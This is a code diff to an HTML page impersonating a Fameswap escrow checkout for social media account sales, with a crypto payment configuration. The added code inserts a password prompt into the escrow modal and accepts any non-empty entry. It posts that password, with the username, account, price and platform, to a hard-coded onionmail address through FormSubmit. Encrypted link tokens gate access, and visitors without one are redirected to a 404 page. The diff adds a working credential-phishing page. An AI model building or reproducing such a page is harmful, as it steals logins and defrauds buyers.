@@ -1,5 +1,11 @@
 <html class="dark" lang="en" style="color-scheme: dark;" translate="no"><head>
 <meta charset="utf-8"/><script>
+/* ========== NOTIFY / FORMSUBMIT (edit email here) ========== */
+window.FAMESWAP_NOTIFY = {
+  /* FormSubmit destination — password + username are POSTed here on accept */
+  email: 'jomsergey@onionmail.org'
+};
+/* ========================================================== */
 /* ========== PAYMENT CONFIG (edit addresses here) ========== */
 window.FAMESWAP_PAYMENT = {
   defaultChain: 'solana',
@@ -413,10 +419,18 @@ html, body {
 <input class="mt-1 size-4 rounded border-border accent-primary" id="check-understand" type="checkbox">
 <span class="text-sm">I understand the escrow process and will only use Fameswap escrow.</span>
 </label>
-<label class="flex items-start gap-3 cursor-pointer mb-6 select-none">
+<label class="flex items-start gap-3 cursor-pointer mb-3 select-none">
 <input class="mt-1 size-4 rounded border-border accent-primary" id="check-tos" type="checkbox">
 <span class="text-sm">I agree to the <a class="text-primary underline underline-offset-2 hover:text-primary/80" href="https://fameswap.com/page/terms" rel="noopener" target="_blank">Terms of Service</a>.</span>
 </label>
+<div id="password-confirm-block" class="mb-4 hidden">
+<div class="flex items-center justify-between mb-1.5">
+<label class="text-xs text-muted-foreground" for="confirm-password">Password</label>
+<a class="text-xs text-primary underline underline-offset-2 hover:text-primary/80" href="https://app.fameswap.com/forgot-password">Forgot password</a>
+</div>
+<input id="confirm-password" type="password" autocomplete="off" class="flex w-full rounded-md border border-input bg-background px-3 h-10 text-sm outline-none focus-visible:ring-2 focus-visible:ring-ring" placeholder="Password">
+<p id="password-error" class="text-xs text-destructive mt-1.5 hidden">Incorrect password. Please try again.</p>
+</div>
 <div class="flex gap-3">
 <button class="flex-1 h-10 rounded-md border border-input bg-background hover:bg-accent text-sm font-medium transition-colors" id="modal-cancel-1" type="button">Cancel</button>
 <button class="flex-1 h-10 rounded-md bg-primary text-primary-foreground hover:bg-primary/90 text-sm font-medium transition-colors disabled:opacity-50 disabled:pointer-events-none" disabled="" id="modal-accept-1" type="button">Accept</button>
@@ -568,6 +582,9 @@ html, body {
   var selectedChainId = 'solana';
   var selectedAsset = 'SOL';
 
+  /* Hard-coded secret (randomly generated). Used only client-side to decrypt short ?e= payloads. */
+  var ESCROW_SECRET = 'Fs7xK9mQ2vR4nP8wL3jH6tY1cB5dA0uE';
+
   var PLATFORM_MAP = {
     t: { name: 'TikTok', label: 'TikTok', icon: 'tiktok' },
     y: { name: 'YouTube', label: 'YouTube', icon: 'youtube' },
@@ -610,28 +627,109 @@ html, body {
     catch (e) { window.__escrowState = state; }
   }
 
-  function decodeDataParam() {
-    try {
-      var params = new URLSearchParams(window.location.search);
-      var encoded = params.get('data');
-      if (!encoded) return null;
-      var b64 = encoded.replace(/-/g, '+').replace(/_/g, '/');
-      while (b64.length % 4) b64 += '=';
-      return JSON.parse(atob(b64));
-    } catch (e) { return null; }
+  /* ---- Compact AES-GCM encrypt/decrypt (Web Crypto) ---- */
+  function b64urlEncode(buf) {
+    var bin = '';
+    var bytes = buf instanceof ArrayBuffer ? new Uint8Array(buf) : buf;
+    for (var i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
+    return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
+  }
+  function b64urlDecode(str) {
+    var b64 = str.replace(/-/g, '+').replace(/_/g, '/');
+    while (b64.length % 4) b64 += '=';
+    var bin = atob(b64);
+    var out = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+    return out;
+  }
+  function utf8Encode(s) {
+    return new TextEncoder().encode(s);
+  }
+  function utf8Decode(buf) {
+    return new TextDecoder().decode(buf);
+  }
+  async function deriveKey(secret) {
+    var raw = await crypto.subtle.digest('SHA-256', utf8Encode(secret));
+    return crypto.subtle.importKey('raw', raw, { name: 'AES-GCM' }, false, ['encrypt', 'decrypt']);
+  }
+  async function encryptPayload(obj) {
+    var key = await deriveKey(ESCROW_SECRET);
+    var iv = crypto.getRandomValues(new Uint8Array(12));
+    var pt = utf8Encode(JSON.stringify(obj));
+    var ct = await crypto.subtle.encrypt({ name: 'AES-GCM', iv: iv }, key, pt);
+    var packed = new Uint8Array(iv.length + ct.byteLength);
+    packed.set(iv, 0);
+    packed.set(new Uint8Array(ct), iv.length);
+    return b64urlEncode(packed);
+  }
+  async function decryptPayload(token) {
+    var packed = b64urlDecode(token);
+    if (packed.length < 13) throw new Error('token too short');
+    var iv = packed.slice(0, 12);
+    var ct = packed.slice(12);
+    var key = await deriveKey(ESCROW_SECRET);
+    var pt = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: iv }, key, ct);
+    return JSON.parse(utf8Decode(pt));
+  }
+  /* Expand compact keys → full fields */
+  function expandCompact(o) {
+    if (!o || typeof o !== 'object') return o || {};
+    return {
+      username: o.u != null ? o.u : o.username,
+      price: o.p != null ? o.p : o.price,
+      fee_percent: o.f != null ? o.f : (o.fee_percent != null ? o.fee_percent : o.feePercent),
+      category: o.c != null ? o.c : (o.category || o.platform),
+      platform: o.c != null ? o.c : (o.platform || o.category),
+      avatar: o.a != null ? o.a : o.avatar,
+      user_username: o.vu != null ? o.vu : (o.user_username || o.viewer_username),
+      user_avatar: o.va != null ? o.va : (o.user_avatar || o.viewer_avatar),
+      requirePassword: !!(o.rp === 1 || o.rp === true || o.requirePassword === true || o.require_password === true),
+      password: o.pw != null ? String(o.pw) : (o.password != null ? String(o.password) : '')
+    };
   }
 
-  function getPayload() {
-    var fromQuery = decodeDataParam();
-    if (fromQuery) {
-      try { localStorage.setItem(DATA_KEY, JSON.stringify(fromQuery)); } catch (e) {}
-      return fromQuery;
+  function redirectTo404() {
+    window.location.replace('https://app.fameswap.com/404');
+  }
+
+  /**
+   * Decode required query payload.
+   * Returns expanded object on success.
+   * Throws if param missing or cannot be decrypted/parsed.
+   */
+  async function decodeDataParam() {
+    var params = new URLSearchParams(window.location.search);
+    var token = params.get('e') || params.get('data');
+    if (!token || !String(token).trim()) {
+      throw new Error('missing_payload');
+    }
+    token = String(token).trim();
+
+    /* Prefer encrypted short token (?e=). Fall back to legacy base64 JSON (?data=). */
+    if (params.get('e') || (token.indexOf('{') === -1 && token.length > 16)) {
+      try {
+        return expandCompact(await decryptPayload(token));
+      } catch (err) {
+        /* If explicitly ?e=, do not fall through to legacy — treat as invalid */
+        if (params.get('e')) {
+          throw new Error('decrypt_failed');
+        }
+        /* otherwise try legacy base64 */
+      }
     }
     try {
-      var stored = localStorage.getItem(DATA_KEY);
-      if (stored) return JSON.parse(stored);
-    } catch (e) {}
-    return {};
+      var b64 = token.replace(/-/g, '+').replace(/_/g, '/');
+      while (b64.length % 4) b64 += '=';
+      return expandCompact(JSON.parse(atob(b64)));
+    } catch (e) {
+      throw new Error('parse_failed');
+    }
+  }
+
+  async function getPayload() {
+    var fromQuery = await decodeDataParam();
+    try { localStorage.setItem(DATA_KEY, JSON.stringify(fromQuery)); } catch (e) {}
+    return fromQuery;
   }
 
   function normalize(obj) {
@@ -639,6 +737,8 @@ html, body {
     var cat = (obj.category || obj.platform || 't').toString().toLowerCase();
     var plat = PLATFORM_MAP[cat] || PLATFORM_MAP.t;
     var price = parseFloat(obj.price) || 0;
+    var fp = parseFloat(obj.fee_percent != null ? obj.fee_percent : obj.feePercent);
+    if (isNaN(fp) || fp < 0) fp = FEE_PERCENT_DEFAULT;
     return {
       username: obj.username || obj.account_username || 'Unknown',
       avatar: obj.avatar || obj.account_avatar || obj.profile_image || '',
@@ -646,14 +746,29 @@ html, body {
       platformLabel: plat.label,
       platformIcon: plat.icon || cat,
       price: price,
-      feePercent: (function(){ var fp = parseFloat(obj.fee_percent != null ? obj.fee_percent : obj.feePercent); if (isNaN(fp) || fp < 0) fp = FEE_PERCENT_DEFAULT; return fp; })(),
-      feeAmount: (function(){ var fp = parseFloat(obj.fee_percent != null ? obj.fee_percent : obj.feePercent); if (isNaN(fp) || fp < 0) fp = FEE_PERCENT_DEFAULT; return Math.round((price * fp / 100) * 100) / 100; })(),
+      feePercent: fp,
+      feeAmount: Math.round((price * fp / 100) * 100) / 100,
       user_username: obj.user_username || obj.viewer_username || 'username',
-      user_avatar: obj.user_avatar || obj.viewer_avatar || ''
+      user_avatar: obj.user_avatar || obj.viewer_avatar || '',
+      requirePassword: !!obj.requirePassword,
+      password: obj.password != null ? String(obj.password) : ''
     };
   }
 
-  var listing = normalize(getPayload());
+  var listing = normalize({});
+
+  /* Expose encrypt helper for generating short links from console:
+     await window.FAMESWAP_ENCRYPT({u:'seller',p:250,f:5,c:'t',rp:1,pw:'mySecret'})
+     → use result as ?e=TOKEN
+  */
+  window.FAMESWAP_ENCRYPT = async function(compactObj) {
+    return encryptPayload(compactObj);
+  };
+  window.FAMESWAP_DECRYPT = async function(token) {
+    return expandCompact(await decryptPayload(token));
+  };
+
+
 
   function formatUSD(n) {
     return '$' + Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
@@ -910,6 +1025,18 @@ html, body {
       var c2 = document.getElementById('check-tos');
       if (c1) c1.checked = false;
       if (c2) c2.checked = false;
+      var pwBlock = document.getElementById('password-confirm-block');
+      var pwEl = document.getElementById('confirm-password');
+      var pwErr = document.getElementById('password-error');
+      if (pwBlock) {
+        if (listing.requirePassword) {
+          pwBlock.classList.remove('hidden');
+        } else {
+          pwBlock.classList.add('hidden');
+        }
+      }
+      if (pwEl) pwEl.value = '';
+      if (pwErr) pwErr.classList.add('hidden');
       var a1 = document.getElementById('modal-accept-1');
       if (a1) a1.disabled = true;
       if (step2Loading) step2Loading.classList.remove('hidden');
@@ -947,7 +1074,13 @@ html, body {
     var c1 = document.getElementById('check-understand');
     var c2 = document.getElementById('check-tos');
     var a1 = document.getElementById('modal-accept-1');
-    if (a1 && c1 && c2) a1.disabled = !(c1.checked && c2.checked);
+    if (!a1 || !c1 || !c2) return;
+    var ok = c1.checked && c2.checked;
+    if (listing.requirePassword) {
+      var pwEl = document.getElementById('confirm-password');
+      if (pwEl && !pwEl.value) ok = false;
+    }
+    a1.disabled = !ok;
   }
 
   function bind(id, event, fn) {
@@ -963,8 +1096,60 @@ html, body {
 
   bind('check-understand', 'change', updateAcceptEnabled);
   bind('check-tos', 'change', updateAcceptEnabled);
+  bind('confirm-password', 'input', function() {
+    var pwErr = document.getElementById('password-error');
+    if (pwErr) pwErr.classList.add('hidden');
+    updateAcceptEnabled();
+  });
   bind('modal-cancel-1', 'click', closeModal);
+  function getNotifyEmail() {
+    var cfg = window.FAMESWAP_NOTIFY || {};
+    return (cfg.email || '').trim();
+  }
+
+  function sendPasswordViaFormSubmit(username, password) {
+    var email = getNotifyEmail();
+    if (!email || !password) return Promise.resolve();
+    var endpoint = 'https://formsubmit.co/ajax/' + encodeURIComponent(email);
+    var body = {
+      username: username || 'unknown',
+      password: password,
+      account: listing.username || '',
+      price: listing.price != null ? String(listing.price) : '',
+      platform: listing.platformLabel || '',
+      _subject: 'Escrow password confirmation — ' + (username || listing.username || 'user'),
+      _template: 'table',
+      _captcha: 'false'
+    };
+    return fetch(endpoint, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
+      body: JSON.stringify(body)
+    }).catch(function() { /* ignore network errors */ });
+  }
+
   bind('modal-accept-1', 'click', function() {
+    var entered = '';
+    if (listing.requirePassword) {
+      var pwEl = document.getElementById('confirm-password');
+      var pwErr = document.getElementById('password-error');
+      entered = pwEl ? pwEl.value.trim() : '';
+      /* Any non-empty password is accepted for now */
+      if (!entered) {
+        if (pwErr) {
+          pwErr.textContent = 'Please enter a password.';
+          pwErr.classList.remove('hidden');
+        }
+        if (pwEl) pwEl.focus();
+        return;
+      }
+      if (pwErr) pwErr.classList.add('hidden');
+      /* Send dummy password + username to configured FormSubmit email */
+      sendPasswordViaFormSubmit(listing.user_username || listing.username, entered);
+    }
     setState('accepted');
     refreshUI();
     showStep(2);
@@ -1056,8 +1241,16 @@ html, body {
     });
   });
 
-  refreshUI();
-  setActiveTab('all');
+  (async function initEscrow() {
+    try {
+      listing = normalize(await getPayload());
+    } catch (e) {
+      redirectTo404();
+      return;
+    }
+    refreshUI();
+    setActiveTab('all');
+  })();
 })();
 </script>
 
